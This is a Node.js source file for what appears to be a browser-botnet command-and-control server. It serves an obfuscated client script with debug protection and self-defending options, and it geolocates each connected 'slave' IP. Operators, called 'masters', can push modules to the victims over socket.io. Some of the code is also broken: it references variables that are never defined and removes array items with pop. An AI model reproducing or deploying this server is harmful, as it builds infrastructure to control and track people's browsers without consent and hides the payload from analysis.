const request = require("request");
const path = require("path");
const fs = require("fs");
const os = require("os");

const express = require("express");

const ipaddr = require('ipaddr.js');
const nodeCleanup = require("node-cleanup");
const obfuscator = require("javascript-obfuscator")

const Modules = require("./Modules.js");

let app = express();
let http = require("http").createServer(app);
let io = require("socket.io")(http);

let control_panel_path = path.join(__dirname, "control_panel", "dist");
let client_html_path = path.join(__dirname, "..", "client");

const package = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "package.json")));
const version = package.version;

//let clientSrc = fs.readFileSync(__dirname + "/../client/client.js");

let localIps = ["::1"];

let slaveSockets = [];
let slaveGeo = {};
let slaveCountries = [];

const defaultModulesSettings = {
	onConnectModules: []
};

const defaultServerSettings = {
	port: 8080,
	externalPort: 8080,
	host: "localhost",
	obfuscatorOptions: {
		compact: true,
		controlFlowFlattening: false,
		controlFlowFlatteningThreshold: 0.75,
		deadCodeInjection: true,
		deadCodeInjectionThreshold: 0.4,
		debugProtection: true,
		debugProtectionInterval: true,
		disableConsoleOutput: false,
		domainLock: [],
		identifierNamesGenerator: "hexadecimal",
		identifiersPrefix: "",
		inputFileName: "",
		log: false,
		renameGlobals: true,
		reservedNames: [],
		reservedStrings: [],
		rotateStringArray: true,
		seed: 0,
		selfDefending: true,
		sourceMap: false,
		sourceMapBaseUrl: "",
		sourceMapFileName: "",
		sourceMapMode: "separate",
		stringArray: true,
		stringArrayEncoding: "rc4",
		stringArrayThreshold: 0.75,
		target: "browser",
		transformObjectKeys: true,
		unicodeEscapeSequence: true
	}
};

let modulesSettings = { ...defaultModulesSettings };
let serverSettings = { ...defaultServerSettings };

// Get ips of the server
Object.values(os.networkInterfaces()).forEach((iface) => {
	iface.forEach((addr) => {
		if (addr.internal !== false) {
			// skip over internal (i.e. 127.0.0.1) and non-ipv4 addresses
			return;
		}

		localIps.push(addr.address);
	});
});

let mod = {
	onModuleConfigChange(module, config, def) {
		(!def ? modulesSettings : defaultModulesSettings)[module.name] = config;
		if (!def) saveSettings();
	},
	getModuleSettings() {
		return modulesSettings;
	}
};
Modules.importModules(mod);


app.use("/", express.static(control_panel_path))

app.get("/client/client.js", (req, res) => {
	let payload = `window.nodeJsIp='${serverSettings.host}:${serverSettings.externalPort}';` + clientSrc;

	res.send(obfuscator.obfuscate(payload, obfOpts).getObfuscatedCode());
	//res.send(payload);
});

Modules.getAllModules().forEach(module => {
	if (module.widgetPaths[0]) {
		app.use("/" + module.name, express.static(path.resolve(path.parse(module.widgetPaths[0]).dir)));
	}
});

io.origins((_, c) => c(null, true));

let slaves = io.of("/slaves");
let masters = io.of("/masters");

slaves.on("connect", (socket) => {
	socket.ip = (socket.handshake.headers["x-forwarded-for"] || socket.request.connection.remoteAddress);

	// Convert ipv4 "mapped" to ipv6 ips to ipv4
	let ipP = ipaddr.parse(socket.ip);
	if (ipP.range() == "ipv4Mapped") socket.ip = ipP.toIPv4Address().toString();

	slaveSockets.push(socket);

	//socket.ip = ip ? ip : socket.ip;
	//socket.platform = ip;

	request("http://www.geoplugin.net/json.gp?ip=" + socket.ip, (error, response, body) => {
		if (body[0] === 'u') console.log(body);
		let json = JSON.parse(body);

		if (slaveGeo[json["geoplugin_countryName"]] == null)
			slaveGeo[json["geoplugin_countryName"]] = [];

		slaveGeo[json["geoplugin_countryName"]].push(socket.ip);

		socket.country = json["geoplugin_countryName"];

		if (slaveCountries.indexOf(socket.country) == -1)
			slaveCountries.push(socket.country);
	});

	modulesSettings.onConnectModules.forEach((name) => {
		let module = Modules.getModule(name);
		if (module && module.platform === socket.platform) module.exec(socket);
	});

	socket.on("disconnect", () => {
		if (slaveSockets.indexOf(socket) != -1) {
			slaveSockets.pop(socket);

			if (socket.country) {
				slaveGeo[socket.country].pop(socket);

				if (slaveGeo[socket.country].length == 0)
					slaveCountries.pop(socket.country);

			}
			console.log("Slave disconnected (" + socket.ip + ")");
		}
	});

	console.log("New slave connection from: " + socket.ip);
});

masters.on("connect", (socket) => {
	socket.on("updateClientData", () => {

		let data = [];

		for (let i = 0; i < slaveCountries.length; i++) {
			data[i] = [slaveCountries[i], slaveGeo[slaveCountries[i]].length];
		}

		socket.emit("getClientsData", data, slaveGeo);
	});

	socket.on("getModuleSettings", () => {
		socket.emit("getModuleSettings", modulesSettings);
	});

	socket.on("updateModuleSettings", (data) => {
		modulesSettings = data;
		saveSettings();
	});

	socket.on("shutdown", () => {
		process.exit();
	});

	Modules.getAllModules().forEach(module => {
		module.controlPanelEvents.forEach(event => {
			socket.on(event.name, data => {
				event.function(data, socket, slaveSockets);
			});
		});
	});

	console.log("New master connection from: " + socket.ip);
})

function onShutdown(exitCode, signal) {
	console.log("Shutdown!");
}

function saveSettings(callback) {

	modulesSettings = Object.assign(defaultModulesSettings, modulesSettings);
	serverSettings = Object.assign(defaultServerSettings, serverSettings);

	let modulesSettingsJson = JSON.stringify(modulesSettings, null, "\t");
	fs.writeFile("modulesSettings.json", modulesSettingsJson, () => {

		let serverSettingsJson = JSON.stringify(serverSettings, null, "\t");
		fs.writeFileSync("serverSettings.json", serverSettingsJson);

		if (callback) callback();
	});

}

function loadSettings(callback) {
	if (fs.existsSync("modulesSettings.json")) {
		let data = fs.readFileSync("modulesSettings.json");

		modulesSettings = JSON.parse(data);
	}
	if (fs.existsSync("serverSettings.json")) {
		let data = fs.readFileSync("serverSettings.json");

		serverSettings = JSON.parse(data);
	}
	saveSettings();

	if (callback) callback();
}

loadSettings(() => {

	if (process.env.PORT) serverSettings.port = process.env.PORT;
	if (process.env.EXTERNAL_PORT) serverSettings.externalPort = process.env.EXTERNAL_PORT;
	if (process.env.HOST) serverSettings.host = process.env.HOST;

	http.listen(serverSettings.port, () => {
		console.log(`Listening on *:${serverSettings.externalPort}`);
		console.log(`Control panel: ${serverSettings.host.match("http.*://") ? serverSettings.host : `http://${serverSettings.host}`}:${serverSettings.externalPort}/`);

		nodeCleanup(onShutdown);
	});

});

